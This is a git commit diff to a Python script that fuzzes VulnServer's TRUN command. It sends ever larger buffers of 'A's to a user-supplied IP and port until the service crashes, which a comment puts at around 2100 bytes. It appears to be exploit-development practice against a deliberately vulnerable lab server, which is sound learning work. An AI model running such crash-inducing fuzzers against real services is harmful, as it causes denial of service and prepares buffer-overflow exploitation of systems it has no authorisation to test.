17c3152f53bda931eb0c373fd8fb3a8d274d93f0
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-09-25 09:59:08 +0530

    Update fuzzing-1.py

--- fuzzing-1.py
+++ fuzzing-1.py
@@ -1,35 +1,38 @@
 #!/usr/bin/python3
 #around 2100 in linegth, the application crashes
 
+#!/usr/bin/python3
+
+import time
 import sys,socket
-from time import sleep
 
-print("************VulnServer TRUN**********")
-
+print("******VulnServer********")
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
+port=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*40)
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
-        print("IP Address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
-        print("IP Address field is empty")
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*40)
+        print("IP address field is empty")
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*40)
+        print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*40)
         print("Issues with the user input")
+
 else:
-    size=100
-    while(size<=10000):
+    buffer=100
+    while (buffer<10000):
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((ip_address, int(port_number)))
-        print(f"Sending buffer --> {size}")
-        s.send(b"TRUN /.:/" + b"A" * size)
+        s.connect((ip_address, int(port)))
+        print(f"****Sending buffer size: {buffer}****")
+        s.send(b"TRUN /.:/ "+ b"A"*buffer)
         s.close()
-        size=size+200
-        sleep(1)
+        buffer=buffer+200
+        time.sleep(2)
+
